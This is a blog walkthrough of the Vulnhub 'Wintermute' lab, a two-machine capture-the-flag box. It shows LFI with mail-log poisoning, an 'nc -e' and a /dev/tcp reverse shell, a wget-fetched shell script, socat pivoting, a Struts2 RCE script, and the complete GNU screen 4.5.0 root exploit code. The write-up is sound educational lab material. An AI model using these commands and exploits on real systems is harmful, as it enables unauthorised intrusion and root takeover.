---
layout: single
title:  "Wintermute - Vulnhub"
path: /posts/
date:   2020-05-02 
tags: LFI Pivoting Tomcat RCE
categories: Vulnhub
classes: wide
author: komodino
excerpt: "Wintermute is an intermediate box. It's actually two boxes, Straylight and Necromancer. You have to acquire root on Straylight first and then pivot to Necromancer since it is located in a different subnet. Vulnerabilities included combining LFI with Mail log injection to achieve RCE in Straylight and a simple tomcat exploit for Secromancer. Priv esc was easy on both machines. Straylight had a vulnerable version of a SUID binary called screen and Necromancer a kernel exploit."
header:
  teaser: /assets/images/wintermute/wintermute.png
  teaser_home_page: true
---

## Setup

Download the box [here](https://www.vulnhub.com/entry/wintermute-1,239/)

The box comes with a text instruction file on how to set up the network properly. First you must create two different Host-Only Networks in VirtualBox. Then assign one adapter to Kali for Host-only #1, two adapters for Straylight in order for it to see both networks, and one adapter for Necromancer for the second network.

This way Straylight will act as a link for us, in order to own Necromancer, which is located in a different subnet.

* **Attacker Machine**  
    Address: 192.168.56.1  vboxnet0
* **Straylight**  
    Address: 192.168.56.102  vboxnet0

    Address: 192.168.57.3 vboxnet1
* **Necromancer**  
    Address: 192.168.57.4 vboxnet1

## Information Gathering  -  Straylight

Running **nmap** with `nmap -sC -sV -p- -O 192.168.56.102`, reveals **3** ports open.

![](/assets/images/wintermute/1.png)

* Two web servers running at port **80** and **3000** respectively.
* And SMTP running at **25**

Let's navigate to apache running at port **80** while also putting **gobuster** to work in the background with 
`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.56.102 -t 20 -o wintermutego`

![](/assets/images/wintermute/2.png)

**gobuster** doesn't reveal anything particularly useful except for the `/freeside` subdirectory, which after visiting we discover is just a static page with an image. Running gobuster from this directory also doesn't return anything, so we shift our attention at port **3000**.

![](/assets/images/wintermute/3.png)

We are presented with a login page to **ntopng**, which is a network traffic monitoring software.
There is an important hint here, that the default credentials are **admin:admin**. Luckily, using these we manage to connect to the server.

Navigating through the page we hit the **_Flow_** tab and notice something interesting. There is another page running at `/turing-bolo`.

![](/assets/images/wintermute/4.png)

So let's visit it.

At `http://192.168.56.102/turing-bolo` we are presented with a "database" of security logs for certain people.

![](/assets/images/wintermute/5.png)

Upon selecting one we see this page

![](/assets/images/wintermute/6.png)

In the page it says that the logs were added to the directory, specifically `molly.log`,`armitage.log`,`riviera.log` If we look at the url we notice something very **interesting**. 

![](/assets/images/wintermute/7.png)

It seems that the **php** is including the page we want to visit and probably appending `.log` in the end.

The internal code probably looks something like this.
```php
<?php
  if(isset($_GET['bolo'])){
    include($_GET['bolo'] . '.log');
  }
?>
```
## Vulnerability Analysis - Straylight

Our first thought is to bypass the `.log` in the end by including something like `../../../../../etc/passwd%00`. Notice the **null byte** in the end to terminate the string so `.log` doesn't affect us. But unfortunately that doesn't work.

### So what can we include?
**.log files of cource!**

Let's try including `../../../../../../var/log/mail` The server will automatically append `.log` to it and voila:

![](/assets/images/wintermute/8.png)

We have the mail log file.
In **php** the `include()` function also executes the code in its parameter. Fortunately for us we can inject malicious php code inside the log file.

**SMTP** is open, so we can send mails to the server. This way we can include malicious content in the mails. The mails probably won't be valid but we don't care, as long as they are recorded in th **log file**.

## Exploitation - Straylight

Let's try and talk to the smtp server using `nc 192.168.56.102 25`

![](/assets/images/wintermute/9.png)

We set the recipient id to a simple **php** command which lets us execute commands using a GET request. Te server may complain about the id, but it will write it in the logs and that is all we care about.

Now start up **Burp Suite** and capture the request. I tried sending a bash reverse shell but it didn't work. But it seems Straylight has a version of `nc` with the `-e` enabled (which lets us execute commands).
So our payload in burp will be `GET /turing-bolo/bolo.php?bolo=../../../../../../../../../var/log/mail&command=nc -e /bin/bash 192.168.56.1 1337` (url-encode the `command` payload)

Start a local listener on port **1337** and send the request. We now have a shell.

![](/assets/images/wintermute/10.png)

We can spawn a tty, with `python -c "import pty;pty.spawn('/bin/bash')"`

## Privilege Escalation - Straylight

After careful enumeration, we notice there is an unusual **SUID** binary in Straylight.

![](/assets/images/wintermute/12.png)

`/bin/screen-4.5.0` stands out and searching for known exploits with `searchsploit screen-4.5.0` reveals 

![](/assets/images/wintermute/13.png)

Based on <a href="http://cvedetails.com">CVE-Details</a>
>GNU screen before 4.5.1 allows local users to modify arbitrary files and consequently gain root privileges by leveraging improper checking of logfile permissions.

There is also a ready-made exploit [here](https://github.com/XiphosResearch/exploits/blob/master/screen2root/screenroot.sh), but I don't like using stuff I don't understand so let's try to break this down.
Feel free to skip this part.

As you already may know, when program is executed the dynamic linker takes care of loading any linked libraries like `libc` in the program. Stuff like `printf` don't actually reside in the executable but are dynamically linked during runtime.

In older linux distributions there is an envirnonment variable called `LD_PRELOAD`. Creating our own shared library and setting `LD_PRELOAD`  equal to that library will order the linker to first load that library and then anything else. But what happens if our custom library contained a `printf` declaration? In this case, we will overwrite the **actual** declaration of `printf` inside **libc** with our own!
Fortunately, `LD_PRELOAD` is disabled by default for executables that have the **SUID** bit enabled or handle files.

In more modern systems that environment variable was replaced with `ld.so.preload`. This file doesn't have the **SUID** limitations of `LD_PRELOAD` because it resides in the `/etc` directory, and if you can write to `/etc` you are probably already **root**.

But this is not the case for us. `screen` is **SUID-Enabled** and due to a bug can write to any file!

Let's examine the code in the provided link.

```c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
```
In the first part `cat << EOF > /tmp/rootshell.c` means to put the following lines in `rootshell.c` until `EOF` is received.
The **C** code effectively makes sure that we are running as **root** and then will execute `/bin/sh`.
After `EOF` we see the compilation command and the deletion of the source file.

Now the shared library part.

```c
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
```

The `__attribute__ ((__constructor__))` line tells `gcc` that the function is a constructor and should be immediately executed upon load.

In the following lines of code we see that it changes the ownership of the executable it created to **root** and makes it **SUID-Enabled**. In the end it will also call `unlink()` on `ld.so.preload`, effectively deleting it. After writing this **C** code to libhax.c, it compiles the library and deletes the source file.

Lastly it exploits the `screen` bug to write to `ld.so.preload` the `libhax.so` library and then execute our `rootshell`.

```bash
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshell
```
In the end, we will have a **SUID** binary that when run, will execute `/bin/sh` as **root**.

Running this script in `/tmp` results in the executable `/tmp/rootshell` which due to the script will automatically run.

And we have **root**

![](/assets/images/wintermute/14.png)

In the `/root` subdirectory we find a very interesting note.

![](/assets/images/wintermute/15.png)

# Necromancer
---

Since we can only talk to Necromancer through Straylight, and Straylight has no `nmap` we will use `nc` to do the portscan.

First let's find the alive hosts with a more traditional way with

```bash
for i in 192.168.57.{1..255} ; do ping -c 1 $i | grep "from" ; done
```

This returns 

![](/assets/images/wintermute/16.png)

We already know **Straylight** is `192.168.57.4`. `192.168.57.5` is probably **Necromancer**, since `192.168.57.2` is our **DHCP** server.

Let's run a scan on it, on all TCP ports with `nc -z -v -n 192.168.57.5 1-65535`.

![](/assets/images/wintermute/17.png)

We see ports **34483**, **8080** and **8009** are open on Necromancer, but we can't really reach them from our own machine. That is why we will need to create a **tunnel**. Basically, this tunnel will bind these ports on **Necromancer** with **Straylight's** ports, so when we will navigate to port **8080** on Straylight all traffic reaching that port will be tunneled throught Straylight to Necromancer. We can create such a tunnel with `socat`, a powerful tool that thankfully is already installed in **Straylight**.

The syntax is 
```bash
socat -v tcp-listen:port,fork,reuseaddr tcp:remotehost:port &
```

Adding the `&` to the end will send the process to the background.

So let's tunnel the three ports 
```bash
socat -v tcp-listen:34483,fork,reuseaddr tcp:192.168.57.5:34483 &
socat -v tcp-listen:8080,fork,reuseaddr tcp:192.168.57.5:8080 &
socat -v tcp-listen:8009,fork,reuseaddr tcp:192.168.57.5:8009 &
```
## Information gathering

Now that we have the tunneling configured, let's run an nmap scan on those ports.

![](/assets/images/wintermute/18.png)

The note mentioned something about **Tomcat**, and we see it running at port **8080** so let's check that. We could have also guessed that since it is the default port for Tomcat.

Let's navigate to **/struts2_2.3.15.1-showcase** which is the directory mentioned in the note at Straylight. Since we have a tunnel, visiting `http://192.168.56.102:8080/struts2_2.3.15.1-showcase` should forward us to Necromancer port **8080**

![](/assets/images/wintermute/19.png)

## Vulnerability Analysis

From the name of the directory we can conclude that this is Struts version **2.3.15**.
Searching for known exploits reveals

![](/assets/images/wintermute/20.png)

Let's use **42324.py**.

To confirm that it works we will tunnel another port. I selected port **4444** and set **tcpdump** to capture incoming traffic.

Now with **42324.py** run `python 42324.py http://192.168.56.102:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action "nc 192.168.57.4 4444"`

As soon as I hit the command **tcpdump** started capturing something, so I believe the command worked.

![](/assets/images/wintermute/21.png)

Now I tried sending numerous different reverse shells back to us, but none worked. Reading a little bit online it seemed that this was a Java runtime issue with the piping in the commands. So the simplest solution was to create a bash script containing the payload, upload it in **Necromancer** and then execute it there.

Since we already have port **4444** tunneled we will create a bash file called `rev.sh` containing this code `bash -i >& /dev/tcp/192.168.56.1/4444 0>&1` and setup a simple HTTP server on the current working dir in the attacking machine with `python -m SimpleHTTPServer 4444`.

Now we send ```python
python 42324.py http://192.168.56.102:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action "wget http://192.168.57.4:4444/rev.sh -O /tmp/rev.sh"```

To upload the shell to **Necromancer** and then ```python python 42324.py http://192.168.56.102:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action "chmod +x /tmp/rev.sh"``` to set it to executable and then ```python python 42324.py http://192.168.56.102:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action "/tmp/rev.sh"``` to execute it.

Now in our listener we have 

![](/assets/images/wintermute/23.png)

## Exploitation

We succesfully have a shell as the user **ta**.

After looking around in the system we stumble upon a file in `/home/ta/ai-guide.txt` revealing the location of the Tomcat install

![](/assets/images/wintermute/24.png)


Enumerating that directory we find a file at `/usr/local/tomcat/conf/tomcat-users.xml`

There is an **HTML-encoded** password for the user **lady3jane**. Pasting this into Burp reveals the password

![](/assets/images/wintermute/26.png)

We can use these credentials to **ssh** into the box. Remember that ssh runs on port **34483** and we tunneled that through Straylight. That way we can connect with `ssh -p 34483 lady3jane@192.168.56.102`

## Privilege Escalation

![](/assets/images/wintermute/27.png)

Searching around in the box reveals an older kernel.

![](/assets/images/wintermute/28.png)

Searching for known exploits reveals a promising `44298.c`

![](/assets/images/wintermute/29.png)

We'll have to compile it in the attacking box, since **gcc** isn't available in **Necromancer**.

I named the executable **elevate** and sent it to **Necromancer** with `wget`.

After storing and running in `/tmp` we have a root shell!

![](/assets/images/wintermute/30.png)

## Flag

![](/assets/images/wintermute/31.png)

